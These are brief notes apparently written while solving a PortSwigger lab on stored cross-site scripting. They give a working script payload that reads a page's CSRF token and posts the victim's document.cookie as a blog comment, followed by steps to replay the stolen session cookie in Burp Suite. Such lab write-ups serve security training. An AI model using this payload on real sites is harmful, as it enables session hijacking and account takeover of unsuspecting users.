## [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

> stored xss

- steal a user cookies by posting it on a blog
- need to get the csrf to able to post with the cookie

```
<script>
  document.addEventListener("DOMContentLoaded", () => {
    let token = document.getElementsByName("csrf")[0].value;
    let data = new FormData();

    data.append("csrf", token);
    data.append("postId", 7);
    data.append("comment", document.cookie);
    data.append("name", "duck");
    data.append("email", "duck@com");
    data.append("website", "http://duck.com");

    fetch("/post/comment", {
      method: "POST",
      mode: "no-cors",
      body: data,
    });
  });
</script>
```

- should see a post like this:

```
secret=...
session=...
```

> the returned session cookie should be used in burp suite repeater using the my-account get request (it can be found in target -> site map)
